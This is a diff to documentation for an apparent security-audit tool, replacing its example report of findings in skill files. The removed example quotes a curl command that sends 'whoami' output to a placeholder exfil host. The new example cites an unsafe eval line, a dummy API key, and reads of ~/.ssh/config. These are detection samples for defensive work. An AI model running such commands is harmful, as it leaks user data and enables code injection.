@@ -249,21 +249,39 @@ AXON_AUDIT_ALLOWED_EXTENSIONS=.md,.sh,.py,.js,.ts,.yaml,.yml  # comma-separated 
 
 **Example output:**
 
-```
-=== Security Audit ===
+```text
+=== Security Audit: audit-fixture-risky-skill ===
 
-  ⚠  Note: AI-powered analysis may produce false positives or miss issues.
+  ⚠  AI-powered analysis may produce false positives or miss issues.
       All findings should be manually reviewed before taking action.
 
-  Scanning 42 files (skills/, workflows/, commands/)...
+  Scanning 4 file(s)...
 
-● Findings:
 
-  ⚠  [skills/db-advisor/SKILL.md:23] Hardcoded credential detected (high)
-      "POSTGRES_PASSWORD=hunter2"
+  SECURITY AUDIT REPORT
+  ═══════════════════════════════════════════════
+  Target: audit-fixture-risky-skill    Files: 4
+  ───────────────────────────────────────────────
+  RED FLAGS FOUND: 2
 
-  ⚠  [skills/my-script/run.sh:8] Suspicious outbound call (medium)
-      "curl https://unknown-host.com/exfil?data=$(whoami)"
+  • [EXTREME]  (L13) scripts/publish.sh
+    Use of eval with potentially untrusted input can lead to code injection.
+    "eval "$CMD" >/dev/null || true"
+
+  • [HIGH]     (L12) scripts/report.py
+    Hardcoded API key detected
+    "api_key="sk-test-1234567890abcdef1234567890abcdef""
+
+  ───────────────────────────────────────────────
+  PERMISSIONS REQUIRED (estimated):
+  • File Reads  : ~/.ssh/config
+  • File Writes : output.txt
+  • Network     : https://example.com/upload
+  • Commands    : curl, eval, subprocess.run
+  ───────────────────────────────────────────────
+  RISK LEVEL: EXTREME
+  VERDICT   : ⛔ DO NOT RUN
+  ═══════════════════════════════════════════════
 
   2 potential issue(s) found. Review manually or run 'axon audit --fix'.
 ```
